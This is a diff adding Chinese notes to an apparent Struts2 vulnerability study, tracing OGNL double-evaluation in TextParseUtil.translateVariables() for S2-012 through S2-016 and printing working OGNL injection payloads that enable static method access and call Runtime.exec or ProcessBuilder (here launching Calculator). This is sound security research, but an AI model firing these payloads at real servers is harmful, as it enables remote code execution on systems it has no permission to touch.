@@ -109,6 +109,17 @@ public static Object translateVariables(char open, String expression, ValueStack
 其中`stack.findValue()`即`OgnlValueStack.findValue()`，最终会调用`OgnlUtil.getValue()`，对OGNL进行解析。  
 第一轮执行到`stack.findValue()`，取出password的表单传入值，如`%{1+1}`。那么在第二轮递归时，可以满足取`%{`的逻辑，然后再次进入到`stack.findValue()`，这次就是对`%{}`括号内的OGNL进行计算了。
 
+S2-001修复时，在截取`%{`的位置后多加了循环判断
+```
+if (start == -1) {
+    int pos = false;
+    ++loopCount;
+    start = expression.indexOf(lookupChars);
+}
+if (loopCount > maxLoopCount) {
+    break;
+}
+```
 
 ### S2-012
 ```
@@ -120,6 +131,65 @@ public static Object translateVariables(char open, String expression, ValueStack
 	</action>
 </package>
 ```
+符合UserAction的跳转逻辑后，会访问`/index.jsp?name=${name}`，`ServletRedirectResult`作为跳转入口，会执行到和S2-001一样的`TextParseUtil.translateVariables()`。
+```
+public static Object translateVariables(char[] openChars, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator, int maxLoopCount) {
+    Object result = expression;
+    char[] arr$ = openChars; // [$,%]
+    int len$ = openChars.length;
+
+    for(int i$ = 0; i$ < len$; ++i$) {
+        char open = arr$[i$];
+        int loopCount = 1;
+        int pos = 0;
+	String lookupChars = open + "{";
+	while(true) {
+            int start = expression.indexOf(lookupChars, pos); // (1)
+	    if (start == -1) {
+                int pos = false;
+                ++loopCount;
+                start = expression.indexOf(lookupChars);
+            }
+
+            if (loopCount > maxLoopCount) {
+                break;
+            }
+	    ...
+	    String var = expression.substring(start + 2, end); // (2)
+	    Object o = stack.findValue(var, asType); // (3)
+	    ...
+    }
+```
+此时第一轮for循环的`expression`是`/index.jsp?name=${name}`，在(1)处查找`${`的位置。在(2)处截取`${}`中的内容，得到`var="name"`。(3)中获取到name传入的真实值，即payload，%{xxx}。然后expression被更新为`/index.jsp?name=%{xxx}`。然后此轮循环完成，返回(1)，再次查找`${}`，没找到，break到最外层的for，进行第二轮for循环
+此时第二轮for循环的`expression`是`/index.jsp?name=%{xxx}`，在(1)处找到`%{`的位置，然后在(2)处截取`%{}`的内容。进入(3)进行OGNL计算。
+
+S2-012的payload有两种，第一种和后面S2-003、S2-005等分析一样，由于Runtime@getRuntime调用静态方法被Struts2禁止，想要先更改allowStaticMethodAccess属性来开启静态方法调用。而第二种则是不采用静态方法调用。直接绕过了这种限制。
+```
+%{#_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec("open -a Calculator.app")}
+%{new java.lang.ProcessBuilder(new java.lang.String[]{"open", "-a","Calculator.app"}).start()}
+```
+S2-001本身禁止了`${}`的循环解析。但是这个跳转利用`${%{}}`绕过了这个限制。S2-012修复则是彻底禁止了二次解析。
+
+### S2-013 & S2-014
+jsp文件中如果包含`<s:a>`或者`<s:url>`标签，这两个标签都包含`includeParams`属性，作用是将当前页面的参数转发到链接中。`includeParams`有三种属性值`none、get、all`分别是不转发参数、转发get参数、转发所有参数。
+```
+<p><s:a id="link1" action="link" includeParams="all">"s:a" tag</s:a></p>
+<p><s:url id="link2" action="link" includeParams="all">"s:url" tag</s:url></p>
+```
+对于标签的处理一般都是从`doStartTag()和doEndTag()`走到`TextParseUtil.translateVariables()`。以`<s:a>`标签为例，它对应Anchor类，在处理参数时，会进行`renderUrl()`操作，获取url对应的action、协议link地址、端口、参数等。然后对参数名和参数值都进行`translateAndEncode()`操作。
+```java
+// UrlHelper
+private static String buildParameterSubstring(String name, String value) {
+    StringBuilder builder = new StringBuilder();
+    builder.append(translateAndEncode(name));  // S2-014 修复时这步变成encode(name)，不再进行解析操作
+    builder.append('=');
+    builder.append(translateAndEncode(value));  // S2-014 修复时这步变成encode(value)，不再进行解析操作
+    return builder.toString();
+}
+```
+顾名思义，该操作进行变量转换和URL编码。而变量转换实际上是`TextParseUtil.translateVariables()`进行OGNL计算。S2-013的payload如下
+```%{#_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec("open /System/Applications/Calculator.app")}```
+`TextParseUtil.translateVariables()`提取`%{}`中的内容，然后执行`stack.findValue()`操作。经过上面分析也知道`TextParseUtil.translateVariables()`还支持`${}`的解析，所以S2-014的payload只是变形为`${}`
 
 ### S2-003
 S2-003的demo写个Action就行。当访问该Action，如`index.action?(xxxx)`时，ParametersInterceptor拦截器会解析参数，将参数通过setParameters()写入到要执行的Action中。
@@ -351,5 +421,27 @@ protected String escape(Object value){
 }
 ```
 
+### S2-015
+官网上给了两种demo。第一种如下，和S2-012重定向类似。要访问的`/${xxx}.jsp`被`TextParseUtil.translateVariables()`提取、解析。
+```
+<action name="*" class="example.ExampleSupport">
+    <result>/example/{1}.jsp</result>
+</action>
+```
+第一种payload如下，可以发现此处对于`allowStaticMethodAccess`相较于之前的payload发生了变化。由`#_memberAccess["allowStaticMethodAccess"]=true`变成了反射写法。究其原因，是SecurityMemberAccess的allowStaticMethodAccess属性变成的final修饰。此处还有一个思路，就是不采用静态方法，而用Processbuilder。
+```
+${#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@java.lang.Runtime@getRuntime().exec('open -a Calculator.app')}.action
+```
+第二种，HttpHeaderResult对头部信息进行处理，同样会走到`TextParseUtil.translateVariables()`进行解析
+```
+<result type="httpheader">
+    <param name="headers.foobar">${message}</param>
+</result>
+```
 
+### S2-016
+问题出在DefaultActionMapper，可以在方法前加上`action:`、`redirect:`或`redirectAction:`，将导航信息附加到表单中。
+```
+redirect:%{#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@java.lang.Runtime@getRuntime().exec('open -a Calculator.app')}
+```
 
